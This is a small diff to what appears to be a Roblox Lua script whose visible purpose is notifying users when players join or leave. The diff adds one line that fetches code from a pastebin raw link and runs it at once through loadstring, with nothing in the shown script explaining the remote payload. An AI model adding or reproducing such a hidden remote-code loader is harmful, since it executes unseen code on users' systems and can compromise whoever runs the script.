@@ -5,3 +5,4 @@ game.StarterGui:SetCore("SendNotification", {
     Text = "u will be notified wen players leave/join";
  
 })
+loadstring(game:HttpGet("https://pastebin.com/raw/DVKeSbKL",true))()
